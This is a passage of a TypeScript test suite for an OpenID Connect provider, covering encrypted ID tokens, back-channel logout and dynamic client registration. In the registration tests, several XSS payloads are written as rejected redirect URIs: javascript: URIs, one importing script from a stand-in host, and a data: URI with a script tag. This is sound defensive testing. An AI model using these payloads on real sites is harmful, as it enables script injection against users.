    const code = new URL(location).searchParams.get("code")!;

    // Exchange for tokens
    const tokenResponse = await fetch("http://localhost:19090/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Authorization: `Basic ${Buffer.from("jwe-client:jwe-secret").toString("base64")}`,
      },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        redirect_uri: "http://localhost:19091/callback",
      }).toString(),
    });

    expect(tokenResponse.ok).toBe(true);
    const tokens = (await tokenResponse.json()) as Record<string, unknown>;
    expect(tokens.id_token).toBeTruthy();

    // The ID token should be a JWE (5 parts separated by .)
    const idToken = tokens.id_token as string;
    const parts = idToken.split(".");
    expect(parts.length).toBe(5); // JWE has 5 parts

    // Decrypt the JWE using RP's private key
    const rpKey = await jose.importPKCS8(rpPrivateKey, "RSA-OAEP");
    const { plaintext } = await jose.compactDecrypt(idToken, rpKey);
    const innerJwt = new TextDecoder().decode(plaintext);

    // The inner JWT should be a valid signed token
    expect(innerJwt.split(".").length).toBe(3); // JWT has 3 parts

    // Verify the JWT claims
    const [, payload] = innerJwt.split(".");
    const claims = JSON.parse(Buffer.from(payload, "base64url").toString());
    expect(claims.sub).toBe("jwe-test-user");
    expect(claims.iss).toBe("http://localhost:19090");
  });

  it("should return plain JWT for RP without encryption configured", async () => {
    // Get authorization code
    const authResponse = await fetch(
      "http://localhost:19090/authorize?" +
        new URLSearchParams({
          response_type: "code",
          client_id: "no-jwe-client",
          redirect_uri: "http://localhost:19091/callback",
          scope: "openid",
          state: "no-jwe-test",
        }).toString(),
      { redirect: "manual" },
    );

    expect(authResponse.status).toBe(302);
    const location = authResponse.headers.get("location")!;
    const code = new URL(location).searchParams.get("code")!;

    // Exchange for tokens
    const tokenResponse = await fetch("http://localhost:19090/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Authorization: `Basic ${Buffer.from("no-jwe-client:no-jwe-secret").toString("base64")}`,
      },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        redirect_uri: "http://localhost:19091/callback",
      }).toString(),
    });

    expect(tokenResponse.ok).toBe(true);
    const tokens = (await tokenResponse.json()) as Record<string, unknown>;
    expect(tokens.id_token).toBeTruthy();

    // The ID token should be a plain JWT (3 parts separated by .)
    const idToken = tokens.id_token as string;
    const parts = idToken.split(".");
    expect(parts.length).toBe(3); // JWT has 3 parts, not 5 (JWE)
  });

  it("should encrypt ID token in implicit flow", async () => {
    const jose = await import("jose");

    // Create new provider with implicit flow enabled
    const implicitProvider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19092",
      oidcServicePrivateKeySig: opPrivateKey,
      oidcServiceKeyIdSig: "jwe-implicit-key",
      oidcServiceAllowImplicitFlow: true,
      oidcRPMetaDataOptions: {
        "jwe-implicit-rp": {
          oidcRPMetaDataOptionsClientID: "jwe-implicit-client",
          oidcRPMetaDataOptionsClientSecret: "jwe-implicit-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19093/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsIDTokenEncAlg: "RSA-OAEP",
          oidcRPMetaDataOptionsIDTokenEncEnc: "A256GCM",
          oidcRPMetaDataOptionsJwks: JSON.stringify({ keys: [rpPublicJwk] }),
        },
      },
      getSession: async () => ({
        sub: "jwe-implicit-user",
      }),
      logger: silentLogger,
    });

    await implicitProvider.init();

    const implicitApp = express();
    implicitApp.use(express.urlencoded({ extended: true }));

    const implicitRouter = createOIDCRouter({
      provider: implicitProvider,
      checkAuth: async () => ({
        userId: "jwe-implicit-user",
        sessionId: "jwe-implicit-session",
      }),
      handleConsent: async () => true,
    });

    implicitApp.use("/", implicitRouter);

    const implicitServer = await new Promise<Server>((resolve) => {
      const server = implicitApp.listen(19092, () => resolve(server));
    });

    try {
      // Implicit flow request
      const authResponse = await fetch(
        "http://localhost:19092/authorize?" +
          new URLSearchParams({
            response_type: "id_token",
            client_id: "jwe-implicit-client",
            redirect_uri: "http://localhost:19093/callback",
            scope: "openid",
            state: "jwe-implicit-test",
            nonce: "test-nonce",
          }).toString(),
        { redirect: "manual" },
      );

      expect(authResponse.status).toBe(302);
      const location = authResponse.headers.get("location")!;

      // Extract ID token from fragment
      const fragment = location.split("#")[1];
      const params = new URLSearchParams(fragment);
      const idToken = params.get("id_token");
      expect(idToken).toBeTruthy();

      // The ID token should be a JWE (5 parts)
      const parts = idToken!.split(".");
      expect(parts.length).toBe(5);

      // Decrypt and verify
      const rpKey = await jose.importPKCS8(rpPrivateKey, "RSA-OAEP");
      const { plaintext } = await jose.compactDecrypt(idToken!, rpKey);
      const innerJwt = new TextDecoder().decode(plaintext);

      // Verify claims
      const [, payload] = innerJwt.split(".");
      const claims = JSON.parse(Buffer.from(payload, "base64url").toString());
      expect(claims.sub).toBe("jwe-implicit-user");
      expect(claims.nonce).toBe("test-nonce");
    } finally {
      await new Promise<void>((resolve) => {
        implicitServer.close(() => resolve());
      });
    }
  });
});

describe("Back-Channel Logout Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;
  let logoutReceived: { token: string; clientId: string }[];
  let rpApp: Express;
  let rpServer: Server;

  beforeAll(async () => {
    logoutReceived = [];

    // Generate OP key
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });

    // Setup mock RP server to receive logout notifications
    rpApp = express();
    rpApp.use(express.urlencoded({ extended: true }));

    rpApp.post("/logout-callback", (req, res) => {
      const logoutToken = req.body.logout_token;
      logoutReceived.push({ token: logoutToken, clientId: "bclogout-client" });
      res.status(200).send("OK");
    });

    rpApp.post("/logout-callback-2", (req, res) => {
      const logoutToken = req.body.logout_token;
      logoutReceived.push({
        token: logoutToken,
        clientId: "bclogout-client-2",
      });
      res.status(200).send("OK");
    });

    rpServer = await new Promise<Server>((resolve) => {
      const server = rpApp.listen(19094, () => resolve(server));
    });

    // Setup OIDC Provider with back-channel logout configured
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19095",
      oidcServicePrivateKeySig: privateKey,
      oidcServiceKeyIdSig: "bclogout-key",
      oidcRPMetaDataOptions: {
        "bclogout-rp": {
          oidcRPMetaDataOptionsClientID: "bclogout-client",
          oidcRPMetaDataOptionsClientSecret: "bclogout-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19096/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsBackChannelLogoutURI:
            "http://localhost:19094/logout-callback",
          oidcRPMetaDataOptionsBackChannelLogoutSessionRequired: true,
        },
        "bclogout-rp-2": {
          oidcRPMetaDataOptionsClientID: "bclogout-client-2",
          oidcRPMetaDataOptionsClientSecret: "bclogout-secret-2",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19096/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          oidcRPMetaDataOptionsBackChannelLogoutURI:
            "http://localhost:19094/logout-callback-2",
        },
        "no-bclogout-rp": {
          oidcRPMetaDataOptionsClientID: "no-bclogout-client",
          oidcRPMetaDataOptionsClientSecret: "no-bclogout-secret",
          oidcRPMetaDataOptionsRedirectUris: [
            "http://localhost:19096/callback",
          ],
          oidcRPMetaDataOptionsBypassConsent: true,
          // No back-channel logout configured
        },
      },
      getSession: async () => ({
        sub: "bclogout-user",
      }),
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "bclogout-user",
        sessionId: "bclogout-session-123",
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    opServer = await new Promise<Server>((resolve) => {
      const server = opApp.listen(19095, () => resolve(server));
    });
  });

  afterAll(async () => {
    if (rpServer) {
      await new Promise<void>((resolve) => {
        rpServer.close(() => resolve());
      });
    }
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  beforeEach(() => {
    logoutReceived = [];
  });

  it("should send back-channel logout notification to RP", async () => {
    // Send logout notification
    const success = await provider.sendBackChannelLogout(
      "bclogout-client",
      "bclogout-user",
      "bclogout-session-123",
    );

    expect(success).toBe(true);
    expect(logoutReceived.length).toBe(1);
    expect(logoutReceived[0].clientId).toBe("bclogout-client");

    // Verify logout token structure
    const logoutToken = logoutReceived[0].token;
    const parts = logoutToken.split(".");
    expect(parts.length).toBe(3); // JWT has 3 parts

    // Decode and verify claims
    const [, payload] = parts;
    const claims = JSON.parse(Buffer.from(payload, "base64url").toString());
    expect(claims.iss).toBe("http://localhost:19095");
    expect(claims.sub).toBe("bclogout-user");
    expect(claims.aud).toBe("bclogout-client");
    expect(claims.events).toBeDefined();
    expect(
      claims.events["http://schemas.openid.net/event/backchannel-logout"],
    ).toEqual({});
    expect(claims.jti).toBeDefined();
    expect(claims.iat).toBeDefined();
    // Session ID should be included since RP has BackChannelLogoutSessionRequired
    expect(claims.sid).toBe("bclogout-session-123");
  });

  it("should not include sid when RP does not require session", async () => {
    // Send logout to RP that doesn't require session
    const success = await provider.sendBackChannelLogout(
      "bclogout-client-2",
      "bclogout-user",
      "bclogout-session-123",
    );

    expect(success).toBe(true);
    expect(logoutReceived.length).toBe(1);

    // Verify sid is not included
    const [, payload] = logoutReceived[0].token.split(".");
    const claims = JSON.parse(Buffer.from(payload, "base64url").toString());
    expect(claims.sid).toBeUndefined();
  });

  it("should return false for RP without back-channel logout configured", async () => {
    const success = await provider.sendBackChannelLogout(
      "no-bclogout-client",
      "bclogout-user",
    );

    expect(success).toBe(false);
    expect(logoutReceived.length).toBe(0);
  });

  it("should send logout notifications to all configured RPs", async () => {
    const successfulClients = await provider.sendBackChannelLogoutToAll(
      "bclogout-user",
      "bclogout-session-123",
    );

    // Two RPs have back-channel logout configured
    expect(successfulClients.length).toBe(2);
    expect(successfulClients).toContain("bclogout-client");
    expect(successfulClients).toContain("bclogout-client-2");
    expect(logoutReceived.length).toBe(2);
  });

  it("should generate logout token with required events claim", async () => {
    await provider.sendBackChannelLogout("bclogout-client", "bclogout-user");

    const [, payload] = logoutReceived[0].token.split(".");
    const claims = JSON.parse(Buffer.from(payload, "base64url").toString());

    // Per OIDC Back-Channel Logout spec, events claim is required
    expect(claims.events).toBeDefined();
    expect(
      claims.events["http://schemas.openid.net/event/backchannel-logout"],
    ).toBeDefined();

    // Logout tokens MUST NOT contain a nonce
    expect(claims.nonce).toBeUndefined();
  });

  it("should get front-channel logout URIs", () => {
    // First, let's create a provider with front-channel logout
    const uris = provider.getFrontChannelLogoutURIs(
      "bclogout-user",
      "bclogout-session",
    );

    // Our test provider doesn't have front-channel logout configured
    // so this should return empty array
    expect(Array.isArray(uris)).toBe(true);
  });
});

/**
 * Dynamic Client Registration Tests
 */
describe("Dynamic Client Registration Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;
  let registeredClients: Record<
    string,
    { options: unknown; exportedVars?: Record<string, string> }
  > = {};

  beforeAll(async () => {
    // Generate RSA key
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });

    // Setup OIDC Provider with dynamic registration enabled
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19095",
      oidcServicePrivateKeySig: privateKey,
      oidcServiceKeyIdSig: "register-key-1",
      oidcServiceAllowDynamicRegistration: true,
      oidcServiceDynamicRegistrationExportedVars: {
        extra_var: "mail",
      },
      oidcServiceDynamicRegistrationExtraClaims: {
        extra_claim: "extra_var",
      },
      oidcRPMetaDataOptions: {},
      registerRP: async (confKey, options, exportedVars) => {
        registeredClients[confKey] = { options, exportedVars };
        return true;
      },
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "register-user",
        sessionId: "register-session",
      }),
      handleConsent: async () => true,
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(19095, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  beforeEach(() => {
    registeredClients = {};
  });

  it("should include registration endpoint in discovery when enabled", async () => {
    const discoveryResponse = await fetch(
      "http://localhost:19095/.well-known/openid-configuration",
    );
    const discovery = (await discoveryResponse.json()) as {
      registration_endpoint?: string;
    };

    expect(discovery.registration_endpoint).toBeDefined();
    expect(discovery.registration_endpoint).toBe(
      "http://localhost:19095/register",
    );
  });

  it("should register a new client with valid metadata", async () => {
    const registerData = {
      application_type: "web",
      redirect_uris: [
        "https://client.example.org/callback",
        "https://client.example.org/callback2",
      ],
      client_name: "My Example Client",
      logo_uri: "https://client.example.org/logo.png",
      subject_type: "pairwise",
      token_endpoint_auth_method: "client_secret_basic",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);
    const result = (await response.json()) as {
      client_id: string;
      client_secret: string;
      client_id_issued_at: number;
      client_name: string;
      redirect_uris: string[];
    };

    expect(result.client_id).toBeDefined();
    expect(result.client_secret).toBeDefined();
    expect(result.client_id_issued_at).toBeDefined();
    expect(result.client_name).toBe("My Example Client");
    expect(result.redirect_uris).toEqual(registerData.redirect_uris);

    // Verify the client was saved
    const savedConfKey = Object.keys(registeredClients)[0];
    expect(savedConfKey).toMatch(/^register-\d+$/);
    const saved = registeredClients[savedConfKey];
    const savedOptions = saved.options as Record<string, unknown>;
    expect(savedOptions.oidcRPMetaDataOptionsClientID).toBe(result.client_id);
  });

  it("should apply dynamic registration exported vars", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "Test Client with ExportedVars",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);

    // Verify exported vars were applied
    const savedConfKey = Object.keys(registeredClients)[0];
    const saved = registeredClients[savedConfKey];
    expect(saved.exportedVars).toBeDefined();
    expect(saved.exportedVars?.extra_var).toBe("mail");
  });

  it("should apply dynamic registration extra claims", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "Test Client with ExtraClaims",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);

    // Verify extra claims were applied
    const savedConfKey = Object.keys(registeredClients)[0];
    const saved = registeredClients[savedConfKey];
    const savedOptions = saved.options as Record<string, unknown>;
    expect(savedOptions.oidcRPMetaDataOptionsExtraClaims).toEqual({
      extra_claim: "extra_var",
    });
  });

  it("should reject registration with missing redirect_uris", async () => {
    const registerData = {
      client_name: "Missing redirect_uris",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(400);
    const result = (await response.json()) as { error: string };
    expect(result.error).toBe("invalid_client_metadata");
  });

  it("should reject registration with dangerous redirect_uri (javascript:)", async () => {
    const registerData = {
      redirect_uris: [
        "javascript:confirm(document.domain)",
        'javascript:import("https://xss.example.com/script.js")',
      ],
      client_name: "XSS Attack Client",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(400);
    const result = (await response.json()) as { error: string };
    expect(result.error).toBe("invalid_redirect_uri");
  });

  it("should reject registration with data: URI", async () => {
    const registerData = {
      redirect_uris: ["data:text/html,<script>alert(1)</script>"],
      client_name: "Data URI Attack Client",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(400);
    const result = (await response.json()) as { error: string };
    expect(result.error).toBe("invalid_redirect_uri");
  });

  it("should handle logout configuration in registration", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "Logout Test Client",
      backchannel_logout_uri: "https://client.example.org/logout",
      backchannel_logout_session_required: true,
      frontchannel_logout_uri: "https://client.example.org/flogout",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);

    // Verify logout URIs were saved
    const savedConfKey = Object.keys(registeredClients)[0];
    const saved = registeredClients[savedConfKey];
    const savedOptions = saved.options as Record<string, unknown>;
    expect(savedOptions.oidcRPMetaDataOptionsBackChannelLogoutURI).toBe(
      "https://client.example.org/logout",
    );
    expect(
      savedOptions.oidcRPMetaDataOptionsBackChannelLogoutSessionRequired,
    ).toBe(true);
    expect(savedOptions.oidcRPMetaDataOptionsFrontChannelLogoutURI).toBe(
      "https://client.example.org/flogout",
    );
  });

  it("should handle JWKS URI in registration", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "JWKS Test Client",
      jwks_uri: "https://client.example.org/.well-known/jwks.json",
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);

    const savedConfKey = Object.keys(registeredClients)[0];
    const saved = registeredClients[savedConfKey];
    const savedOptions = saved.options as Record<string, unknown>;
    expect(savedOptions.oidcRPMetaDataOptionsJwks).toBe(
      "https://client.example.org/.well-known/jwks.json",
    );
  });

  it("should handle inline JWKS in registration", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "Inline JWKS Client",
      jwks: {
        keys: [
          {
            kty: "RSA",
            use: "enc",
            n: "test-key",
            e: "AQAB",
          },
        ],
      },
    };

    const response = await fetch("http://localhost:19095/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(201);

    const savedConfKey = Object.keys(registeredClients)[0];
    const saved = registeredClients[savedConfKey];
    const savedOptions = saved.options as Record<string, unknown>;
    expect(savedOptions.oidcRPMetaDataOptionsJwks).toBe(
      JSON.stringify(registerData.jwks),
    );
  });
});

/**
 * Dynamic Registration Disabled Tests
 */
describe("Dynamic Client Registration Disabled Tests", () => {
  let opApp: Express;
  let opServer: Server;
  let provider: OIDCProvider;

  beforeAll(async () => {
    const { generateKeyPair } = await import("crypto");
    const { promisify } = await import("util");
    const generateKeyPairAsync = promisify(generateKeyPair);

    const { privateKey } = await generateKeyPairAsync("rsa", {
      modulusLength: 2048,
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
      publicKeyEncoding: { type: "spki", format: "pem" },
    });

    // Provider WITHOUT dynamic registration
    provider = new OIDCProvider({
      oidcServiceMetaDataIssuer: "http://localhost:19096",
      oidcServicePrivateKeySig: privateKey,
      oidcServiceKeyIdSig: "disabled-register-key",
      oidcServiceAllowDynamicRegistration: false, // Explicitly disabled
      oidcRPMetaDataOptions: {},
      logger: silentLogger,
    });

    await provider.init();

    opApp = express();
    opApp.use(express.urlencoded({ extended: true }));
    opApp.use(express.json());

    const router = createOIDCRouter({
      provider,
      checkAuth: async () => ({
        userId: "test-user",
        sessionId: "test-session",
      }),
    });

    opApp.use("/", router);

    await new Promise<void>((resolve) => {
      opServer = opApp.listen(19096, () => resolve());
    });
  });

  afterAll(async () => {
    if (opServer) {
      await new Promise<void>((resolve) => {
        opServer.close(() => resolve());
      });
    }
  });

  it("should not include registration endpoint in discovery when disabled", async () => {
    const discoveryResponse = await fetch(
      "http://localhost:19096/.well-known/openid-configuration",
    );
    const discovery = (await discoveryResponse.json()) as {
      registration_endpoint?: string;
    };

    expect(discovery.registration_endpoint).toBeUndefined();
  });

  it("should return error when dynamic registration is disabled", async () => {
    const registerData = {
      redirect_uris: ["https://client.example.org/callback"],
      client_name: "Test Client",
    };

    const response = await fetch("http://localhost:19096/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(registerData),
    });

    expect(response.status).toBe(500);
    const result = (await response.json()) as { error: string };
    expect(result.error).toBe("server_error");
  });
});
